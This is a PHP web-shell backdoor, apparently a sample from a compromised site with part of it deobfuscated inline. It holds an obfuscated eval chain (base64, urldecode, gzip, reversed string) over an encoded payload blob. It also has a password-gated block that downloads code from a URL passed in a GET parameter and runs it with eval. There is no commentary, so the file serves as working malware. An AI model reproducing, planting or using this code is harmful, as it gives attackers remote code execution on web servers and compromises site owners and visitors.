<?php

$co = "htmlspecialchars_decode";
$na = "base64_decode";
$ro = "urldecode";
$AmInE = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRBbWluZURucyUyOSUyOSUyOSUyOSUyOSUzQg==";
$AmineDns = "8r5WXBw/1gGWzrAWmjmk6m0qSRaYbSRzGV+1PTovZIFv1Z9+22b9P3H+nHY+p73efb1S4Q1gXi2KXHz/67If47sEjyc1UlM2DS7l21+tVZoy2K9oKV7GcH+osdnZ16UjY3qW5qlp7k/trxYXEtIHZdFSu8CAtTVLjHBuYFrQ16Lji+/xHJYVTZYuU5kQ4ACR6cJhOVcZ6IkB8MKkloMfVJdLgtKfF2M4UkkTR+JGmKF5OwMJviDIAz5+TWvLx39TSbrOJPv0FTna6YrVPwdT6gdMKvYtzTOFTnSngox0WE4fdlA8hY6IuIfjykNBp4Y/CDsMhFLfNnXpz8DvCqVY+cHUTwEk+w2ggIBYByeAaFG/AMVJzGY1x8BdIYqENvTnVKTSz0+rKtwi8Y1hd2bndmJn+K6aHsn/18CBSB6xoGPR0odbiaZohaPwRtaoJKqqDJxFQsZF8DBUC622QVFn45/nBAWA";
/* #1: PHPDeobfuscator eval output */ 
    $PAT = 'i';
    $xNgur = 'l';
    $yl = '6';
    $hn = '_';
    $q = 'o';
    $DVe = 'e';
    $VujVi = 'f';
    $Njf = 'n';
    $WL = 't';
    $hjmv = '4';
    $cyx = 'c';
    $w = 'b';
    $qb = 'a';
    $Hn = 'z';
    $C = 's';
    $iEg = 'g';
    $ZQFv = 'd';
    $strNX = "base64_decode";
    $c_init = 'curl_init';
    $c_setopt = 'curl_setopt';
    $c_exec = 'curl_exec';
    if (isset($_GET['u']) && isset($_GET['pw'])) {
        if (strtoupper(md5($_GET['pw'])) != '51332D9B35DBD49E045292AC14C6DDAF') {
            exit;
        }
        $ch = $c_init($strNX($_GET['u']));
        $c_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $r = $c_exec($ch);
        eval('?>' . $r);
        die;
    }
/* END:#1 */
exit;
